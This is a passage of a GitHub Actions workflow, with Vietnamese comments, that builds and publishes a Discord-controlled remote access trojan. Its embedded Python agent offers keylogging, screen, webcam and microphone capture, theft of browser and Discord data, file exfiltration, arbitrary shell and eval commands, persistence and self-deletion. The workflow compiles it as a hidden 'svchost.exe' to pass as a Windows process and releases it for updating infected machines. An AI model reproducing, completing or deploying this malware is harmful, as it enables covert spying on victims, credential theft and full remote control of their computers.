          async def c_beep(m, a):    await m.channel.send(await ex(f_beep))

          async def c_keylog(m, a):  await send_long(m, await ex(f_keylog, a[0] if a else "dump"))
          async def c_type(m, a):    await m.channel.send(await ex(f_type, " ".join(a)))
          async def c_mouse(m, a):   await m.channel.send(await ex(f_mouse, a))
          async def c_caps(m, a):    await m.channel.send(await ex(f_caps))
          async def c_desk(m, a):    await m.channel.send(await ex(f_desk))
          async def c_mute(m, a):    await m.channel.send(await ex(f_mute))
          async def c_volup(m, a):   await m.channel.send(await ex(f_volup, a[0] if a else 5))
          async def c_voldown(m, a): await m.channel.send(await ex(f_voldown, a[0] if a else 5))

          async def c_wifi(m, a):    await send_long(m, await ex(f_wifi))
          async def c_net(m, a):     await send_long(m, await ex(f_net))
          async def c_ports(m, a):   await send_long(m, await ex(f_ports))
          async def c_ping(m, a):    await send_long(m, await ex(f_ping, " ".join(a) or "8.8.8.8"))
          async def c_arp(m, a):     await send_long(m, await ex(f_arp))
          async def c_dns(m, a):     await m.channel.send(await ex(f_dns))
          async def c_dl(m, a):      await m.channel.send(await ex(f_dl, a))
          async def c_speedtest(m, a):await m.channel.send(await ex(f_speedtest))

          async def c_cd(m, a):      await m.channel.send(await ex(f_cd))
          async def c_flip(m, a):    await m.channel.send(await ex(f_flip))
          async def c_volume(m, a):  await m.channel.send(await ex(f_volume, a))
          async def c_bsod(m, a):    await m.channel.send("💥 BSOD...")
          async def c_id(m, a):      await m.channel.send(f"🆔 `{MACHINE_ID}`")
          async def c_persist(m, a): await ex(install); await m.channel.send("✅ Đã cài lại persist")
          async def c_restart(m, a): await m.channel.send("♻️ Đang khởi động lại..."); await ex(f_restart)

          async def c_grab(m, a):
              await m.channel.send("📦 Đang gom loot..."); p = await ex(f_grab)
              await m.channel.send(file=discord.File(p, filename=f"grab_{MACHINE_ID}.zip"))
          async def c_browser(m, a): await send_long(m, await ex(f_browser))
          async def c_discord(m, a): await send_long(m, await ex(f_discord))

          async def c_download(m, a):
              path = os.path.expanduser(" ".join(a))
              if not os.path.exists(path): return await m.channel.send(f"❌ Không thấy: {path}")
              if os.path.isdir(path):
                  p = await ex(f_zip, path)
                  return await m.channel.send(file=discord.File(p, filename="folder.zip"))
              await m.channel.send(file=discord.File(path))
          async def c_zip(m, a):
              p = await ex(f_zip, " ".join(a) or ".")
              await m.channel.send(file=discord.File(p, filename="dump.zip"))
          async def c_upload(m, a):
              if not m.attachments: return await m.channel.send("❌ Kèm file vào tin nhắn")
              for at in m.attachments:
                  await at.save(os.path.join(LOOT_DIR, at.filename))
              await m.channel.send(f"✅ Đã nhận {len(m.attachments)} file → {LOOT_DIR}")
          async def c_update(m, a):
              await m.channel.send("🔄 Đang cập nhật..."); await ex(f_update, " ".join(a))

          async def c_eval(m, a):
              raw = getattr(m, "_raw", " ".join(a))
              await send_long(m, await ex(f_eval, raw))
          async def c_exec(m, a):
              raw = getattr(m, "_raw", " ".join(a))
              await send_long(m, await ex(f_exec, raw))

          async def c_join(m, a):
              global _vc, _src
              vs = getattr(m.author, "voice", None)
              if not vs or not vs.channel:
                  return await m.channel.send("❌ Bạn phải vào 1 voice channel trước")
              ch = vs.channel
              if _vc and _vc.is_connected(): await _vc.move_to(ch)
              else: _vc = await ch.connect()
              kind = (a[0].lower() if a else "mic")
              if kind not in ("mic","sys"): kind = "mic"
              if _src: _src.running = False
              _src = StreamSource(kind)
              _vc.play(_src)
              await m.channel.send(f"🔊 Vào `{ch.name}` — phát **{kind}**")
          async def c_leave(m, a):
              global _vc, _src
              if _src: _src.running = False
              if _vc and _vc.is_connected(): await _vc.disconnect()
              _vc = None; _src = None
              await m.channel.send("⏹️ Đã rời voice")

          async def c_huy(m, a):
              await m.channel.send("💥 Tự hủy...")
              await ex(uninstall); time.sleep(0.5)
              subprocess.Popen(
                  f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
                  shell=True, creationflags=NO_WIN)
              os._exit(0)

          COMMANDS = {
              "help":c_help,"cmd":c_cmd,"sh":c_sh,"shell":c_sh,"ps1":c_ps1,"powershell":c_ps1,
              "pwd":c_pwd,"cddir":c_cddir,
              "ls":c_ls,"cat":c_cat,"write":c_write,"mkdir":c_mkdir,"copy":c_copy,"move":c_move,
              "rename":c_rename,"tree":c_tree,"du":c_du,"hex":c_hex,"search":c_search,"find":c_search,
              "del":c_del,
              "sysinfo":c_sysinfo,"ps":c_ps,"tasklist":c_ps,"kill":c_kill,"start":c_start,
              "power":c_power,"drives":c_drives,"env":c_env,"users":c_users,"services":c_services,
              "startup":c_startup,"schedule":c_schedule,"uptime":c_uptime,"battery":c_battery,
              "gpu":c_gpu,"av":c_av,"installed":c_installed,"recycle":c_recycle,
              "clip":c_clip,"msg":c_msg,"notify":c_notify,"wall":c_wall,"open":c_open,"play":c_play,
              "chupanh":c_chupanh,"chupmanhinh":c_chupmanhinh,"sc":c_chupmanhinh,"monitors":c_monitors,
              "record":c_record,"camgif":c_camgif,"mic":c_mic,"speak":c_speak,"beep":c_beep,
              "keylog":c_keylog,"type":c_type,"mouse":c_mouse,"caps":c_caps,"desk":c_desk,
              "mute":c_mute,"volup":c_volup,"voldown":c_voldown,
              "wifi":c_wifi,"net":c_net,"ip":c_net,"ports":c_ports,"ping":c_ping,"arp":c_arp,
              "dns":c_dns,"dl":c_dl,"wget":c_dl,"speedtest":c_speedtest,
              "cd":c_cd,"cdrom":c_cd,"flip":c_flip,"volume":c_volume,"bsod":c_bsod,
              "grab":c_grab,"browser":c_browser,"discord":c_discord,
              "update":c_update,"restart":c_restart,"persist":c_persist,"id":c_id,"huy":c_huy,
              "download":c_download,"zip":c_zip,"upload":c_upload,
              "eval":c_eval,"exec":c_exec,
              "join":c_join,"leave":c_leave,
          }

          @client.event
          async def on_ready():
              print(f"[*] online: {client.user} | máy: {MACHINE_ID}")

          @client.event
          async def on_message(message):
              if message.author.bot: return
              content = message.content.strip()
              if not content.startswith(PREFIX): return
              content = content[len(PREFIX):].strip()
              if not content: return

              tokens = content.split(None, 1)
              first = tokens[0].lower()
              if first == "all" or first == MACHINE_ID.lower():
                  rest = tokens[1] if len(tokens) > 1 else ""
                  t2 = rest.split(None, 1)
                  name = t2[0].lower() if t2 else ""
                  raw = t2[1] if len(t2) > 1 else ""
              else:
                  name = first
                  raw = tokens[1] if len(tokens) > 1 else ""

              if not name or name not in COMMANDS: return
              setattr(message, "_raw", raw)
              args = raw.split()
              try: await COMMANDS[name](message, args)
              except Exception as e:
                  await message.channel.send(f"⚠️ Lỗi `{name}`: {e}")

          if __name__ == "__main__":
              if not single_instance(): sys.exit(0)
              hide_console()
              if not os.path.exists(MARKER): install()
              while True:
                  try: client.run(TOKEN)
                  except Exception as e:
                      print("bot lỗi, thử lại 5s:", e); time.sleep(5)
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "agent.py"), $py)

      - name: Kiểm tra cú pháp agent.py
        run: |
          python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: cú pháp hợp lệ')"

      - name: Cài thư viện Python
        run: |
          python -m pip install --upgrade pip
          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pycryptodome pyinstaller

      - name: Tải libopus-0.dll
        shell: pwsh
        run: |
          $urls = @(
            "https://github.com/DSharpPlus/DSharpPlus/raw/master/docs/natives/vnext_natives_win32_x64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-opus-1.3-win64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-win64.zip"
          )
          $ok = $false
          foreach ($u in $urls) {
            try {
              Write-Host "Tải $u"
              Invoke-WebRequest -Uri $u -OutFile opus.zip -TimeoutSec 90 -ErrorAction Stop
              Remove-Item opus_tmp -Recurse -Force -ErrorAction SilentlyContinue
              Expand-Archive opus.zip -DestinationPath opus_tmp -Force
              $dll = Get-ChildItem -Path opus_tmp -Recurse -File |
                     Where-Object { $_.Name -match '^(lib)?opus.*\.dll$' } |
                     Select-Object -First 1
              if ($dll) { Copy-Item $dll.FullName "libopus-0.dll" -Force; $ok = $true; Write-Host "Lấy được: $($dll.Name)"; break }
            } catch { Write-Host "Thử $u thất bại..." }
          }
          if ($ok) { Write-Host "OK: đã có libopus-0.dll" } else { Write-Host "::warning::Không tải được opus, voice sẽ lỗi" }

      - name: Nhúng token vào agent.py
        shell: pwsh
        env:
          BOT_TOKEN: ${{ github.event.inputs.token }}
        run: |
          Write-Host "::add-mask::$env:BOT_TOKEN"
          $inject = @'
          import os, re
          s = open("agent.py", encoding="utf-8").read()
          s = re.sub(r'TOKEN\s*=\s*".*?"', 'TOKEN = "' + os.environ["BOT_TOKEN"] + '"', s, count=1)
          open("agent.py", "w", encoding="utf-8").write(s)
          '@
          $inject | python -
          python -c "print([l.strip() for l in open('agent.py',encoding='utf-8') if 'TOKEN =' in l][0])"

      - name: Build exe
        run: |
          pyinstaller --noconfirm --onefile --noconsole --name svchost --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 agent.py

      - name: Chạy test trực tiếp
        if: ${{ github.event.inputs.run_minutes != '0' }}
        shell: pwsh
        env:
          RUN_MIN: ${{ github.event.inputs.run_minutes }}
        run: |
          Write-Host "=== BẮT ĐẦU TEST — vào Discord nhắn lệnh ==="
          Write-Host "Thử: !id   !sysinfo   !sh whoami   !ls C:\   !grab   !sh chcp"
          $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
          Write-Host "PID $($p.Id) — chạy $env:RUN_MIN phút"
          $secs = [int]$env:RUN_MIN * 60
          for ($i = 1; $i -le $secs; $i += 15) {
            if ($p.HasExited) { Write-Host "Tiến trình thoát sớm!"; break }
            Start-Sleep -Seconds 15
            Write-Host "[$i s] đang chạy..."
          }
          if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }
          Write-Host "=== KẾT THÚC TEST ==="

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: svchost-exe
          path: dist/svchost.exe
          if-no-files-found: error

  release:
    needs: build
    if: ${{ github.event.inputs.make_release == 'yes' }}
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Tải artifact
        uses: actions/download-artifact@v4
        with:
          name: svchost-exe

      - name: Tạo Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: svchost build ${{ github.run_number }}
          body: |
            Build tự động từ run #${{ github.run_number }}
            Token đã nhúng sẵn lúc build.
            Cập nhật máy đang chạy: `!update <url file exe dưới đây>`
          files: svchost.exe
          make_latest: true
